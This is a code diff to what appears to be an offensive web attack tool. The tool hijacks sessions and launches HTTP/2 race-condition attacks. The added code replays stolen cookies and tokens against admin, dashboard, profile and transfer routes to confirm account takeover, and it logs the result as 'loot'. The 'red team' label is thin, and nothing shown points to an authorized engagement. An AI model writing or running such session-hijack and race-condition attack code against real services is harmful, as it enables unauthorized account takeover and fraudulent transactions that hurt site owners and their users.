@@ -286,9 +286,26 @@ async def async_main():
         session_loot = await run_session_hijack(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
         if session_loot:
             alert_loot("Hijacked Session / Valid Cookie Jar", session_loot)
+            
+            # AUTOMATED RED TEAM VERIFICATION & HTML REPORT EXPORT
+            display_progress("Verifying hijacked session live against target protected routes...")
+            cookie_jar_to_test = session_loot.get("cookies") if isinstance(session_loot, dict) else {}
+            token_to_test = session_loot.get("token") if isinstance(session_loot, dict) else None
+            
+            # Test key administrative and user routes
+            for route in ["/admin", "/dashboard", "/api/user/profile", "/transfer"]:
+                verified = execute_live_login_verification(
+                    target_url=target["url"],
+                    endpoint=route,
+                    cookie_dict=cookie_jar_to_test,
+                    token=token_to_test
+                )
+                if verified:
+                    log(f"[+] Loot successfully verified and saved to session_loot_report.html from {route}!", GREEN)
+                    break
 
         display_progress("Firing HTTP/2 single-packet multiplexed streams against transaction race condition windows.")
-        race_loot = await run_race_condition_test(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
+        race_loot = await run_race_condition_test(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"), session_pool=None)
         if race_loot:
             successful_races = [r for r in race_loot if r.get("status") in (200, 201)]
             if successful_races:
